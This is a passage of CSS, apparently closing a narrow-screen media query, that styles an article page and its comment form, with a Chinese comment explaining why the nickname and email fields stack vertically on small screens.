  .art-wrap { padding: 20px 16px 48px; }
  .doc { padding: 26px 20px 32px; border-radius: 18px; }
  .doc-title { font-size: 24px; }
  /* 昵称与邮箱在窄屏改成上下排：两栏挤在 320px 里每个只有 140px，字都显示不全 */
  .cm { padding: 22px 18px 26px; border-radius: 18px; }
  .cm-fields { grid-template-columns: 1fr; }
}
</style>
